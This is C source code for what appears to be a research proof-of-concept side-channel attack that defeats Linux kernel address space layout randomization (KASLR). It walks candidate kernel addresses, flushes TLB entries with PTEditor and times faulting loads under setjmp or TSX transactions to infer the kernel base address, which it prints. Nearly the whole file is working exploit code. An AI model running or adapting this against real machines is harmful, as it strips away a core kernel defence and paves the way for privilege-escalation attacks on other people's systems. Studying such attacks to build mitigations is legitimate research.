#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>
#include <time.h>
#include "include/cache_utils.h"
#include "third_party/PTEditor/ptedit_header.h"

#define FROM 'A'
#define TO 'Z'

#ifndef SIG_UNBLOCK
#define SIG_UNBLOCK 1
#endif

#define USE_SYSTEM_JMP

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
#define entry_SYSCALL_64_offset 0x400000ull

#define STEP 0x100000ull
#define SCAN_START KERNEL_LOWER_BOUND + entry_SYSCALL_64_offset
#define SCAN_END KERNEL_UPPER_BOUND + entry_SYSCALL_64_offset

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE (SCAN_END - SCAN_START) / STEP

static jmp_buf jbuf;
size_t test_num, argmax;
uint64_t secret = 83, len = 5, try_times = 50, success_count;
uint64_t start_time, spend_time, max_time;
int hist[256];
int record[ARR_SIZE];

size_t invalid_addrs[ARR_SIZE] = {};

static void segfault_handler(int signum)
{
    (void)signum;
    unblock_signal(SIGSEGV);
    longjmp(jbuf, 1);
}

int attack(size_t invalid_addr, int idx)
{
    for (int size = 0; size < len; size++)
    {
        memset(hist, 0, sizeof(hist));
        for (int i = 0; i < try_times; i++)
        {
            max_time = 0;
            for (test_num = FROM; test_num <= TO; test_num++)
            {
                for (size_t j = idx; j < idx + 3; j++)
                {
                    // This could be replaced by another invalidation method
                    ptedit_invalidate_tlb(invalid_addrs + j);
                }
                mfence();
                mfence();
                mfence();

                start_time = rdtsc();
#ifdef USE_SYSTEM_JMP
                if (!setjmp(jbuf))
                // verified in i9-10980XE, etc.
#else
                if (xbegin() == (~0u))
                // verified in i7-6700, i7-7700, etc.
#endif
                {
                    mfence();
                    asm volatile(
                        "mov %[test_num], %%rbx\n\t"
                        "movq (%1), %%rax\n\t"
                        "sub (%[sec]), %%rbx\n\t" // 83 = 0x53 = 'S', 88 = 0x58 = 'X'
                        :
                        : [test_num] "r"(test_num), "c"(invalid_addr), [sec] "r"(&secret)
                        :);
                    asm volatile(
                        "jz equal\n\t"
                        "jmp notequal\n\t"
                        "equal: nop\n\t");
                    printf("you can not see me\n");
                    asm volatile(
                        "notequal: nop\n\t");
                    mfence();
                }
                spend_time = rdtsc() - start_time;
                mfence();
                if (max_time < spend_time)
                {
                    max_time = spend_time;
                    argmax = test_num;
                }
            }
            hist[argmax]++;
        }

        int max_i = -1, max_i_index = -1;
        for (int i = FROM; i <= TO; i++)
        {
            if (max_i < hist[i])
            {
                max_i = hist[i];
                max_i_index = i;
            }
        }
        if (max_i_index == secret)
            success_count++;
    }
}

int main(int argc, char *argv[])
{
    ptedit_init();
    signal(SIGSEGV, segfault_handler);
    printf("ARR_SIZE: %d\n", ARR_SIZE);
    int max_idx = ARR_SIZE; // for debug
    for (uint64_t idx = 0; idx < ARR_SIZE; idx++)
    {
        invalid_addrs[idx] = SCAN_START + idx * STEP;
    }
    struct timespec start, end;
    mfence();
    timespec_get(&start, TIME_UTC);
    for (size_t i = 0; i < sizeof(invalid_addrs) / sizeof(size_t); i++)
    {
        size_t invalid_addr = invalid_addrs[i];
        success_count = 0;
        attack(invalid_addr, i);
        record[i] = success_count;
        printf("invalid_addr: %lx\tsuccess_count: %ld\n", (uint64_t)invalid_addr, success_count);
        if (i > max_idx || success_count == 0)
        {
            break;
        }
    }
    timespec_get(&end, TIME_UTC);
    ptedit_cleanup();
    int min_i = 0xfffffff, min_i_index = -1;
    for (int i = 0; i < sizeof(invalid_addrs) / sizeof(size_t); i++)
    {
        if (min_i > record[i])
        {
            min_i = record[i];
            min_i_index = i;
        }
        if (i > max_idx)
        {
            break;
        }
    }
    printf("KASLR base: 0x%016lx\n", invalid_addrs[min_i_index]);
    // printf second
    double time_used = (end.tv_sec - start.tv_sec) * 1000000000 + (end.tv_nsec - start.tv_nsec);
    printf("time: %lfs\n", time_used / 1000000000);
    return 0;
}